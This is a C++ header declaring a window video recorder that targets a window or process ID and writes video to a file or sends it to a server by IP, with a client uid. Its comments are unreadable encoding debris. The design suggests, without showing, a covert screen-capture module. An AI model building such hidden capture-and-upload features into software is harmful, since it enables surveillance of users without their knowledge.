#pragma once

#include "manager.h"
#include "WndRec.h"

namespace WndRec
{

struct InOutData
{
	int typeIn; //0 - ��������� hwnd, 1 - � pid
	int typeOut; //0 - ������ � ����, 1 - ������ � ip
	union
	{
		HWND hWnd;
		DWORD pid;
	};
	char* nameFile;
};

struct RecParam
{
	InOutData iod;
	char uid[128];
	union 
	{
		char nameVideo[64];
		char path[MAX_PATH];
	};
	int seconds;
	int flags;
	ServerData* server;
};

const int VIDEO_FULLSCREEN = 0x0001; //������������� ������
const int VIDEO_ALWAYS	   = 0x0002; //���������� ������, ���� ���� ���� �� �������

const int MAX_VIDEO_SIZE = 50 * 1024 * 1024; //������������ ������ ����� �����
const int MAX_VIDEO_FRAMES = 4 * 2 * 3600; //������������ ���������� ������ � ����� ����� (~4 ����)
const int PERIOD_FIRST_FRAME = 2 * 60 * 3; //������ 3 ��� ����� ��������� ����

//���� server = 0, �� ����� � ���� nameVideo
void StartRecHwnd( ServerData* server, const char* uid, char* nameVideo, HWND wnd, int seconds, int flags );
void StartRecPid( ServerData* server, const char* uid, char* nameVideo, DWORD pid, int seconds, int flags );
void SendFirstFrame( ServerData* server );
void StopRec();

}
